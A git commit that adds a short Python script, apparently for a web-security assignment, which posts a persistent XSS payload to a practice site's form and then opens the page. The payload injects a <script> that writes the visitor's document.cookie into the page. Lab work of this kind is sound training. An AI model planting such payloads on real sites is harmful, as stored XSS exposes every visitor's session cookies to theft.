b2636aec750db4bfbab7bd96e47e88f6e653dbc6
Yumingyuan <timdavid@vip.qq.com>
2019-05-24 15:28:25 +0800

    persistent XSS

---
+++ wsb/case04_Persistent_XSS.py
@@ -0,0 +1,12 @@
+import requests
+import webbrowser
+base_url="http://www.wsb.com/Assignment2/case04.php"
+#payload create a <p> and write cookie in it 
+payload={"title":"yumingyuan","content":"<script>div_object=document.createElement('p');div_object.id='yum1ngyuan';div_object.innerHTML=document.cookie;document.body.appendChild(div_object);</script>"}
+#post malicious code
+r=requests.post(base_url,data=payload)
+#try to get flag
+#r=requests.get(base_url)
+#print(r.text)
+#use web browser to open check attack result
+webbrowser.open("http://www.wsb.com/Assignment2/case04.php")
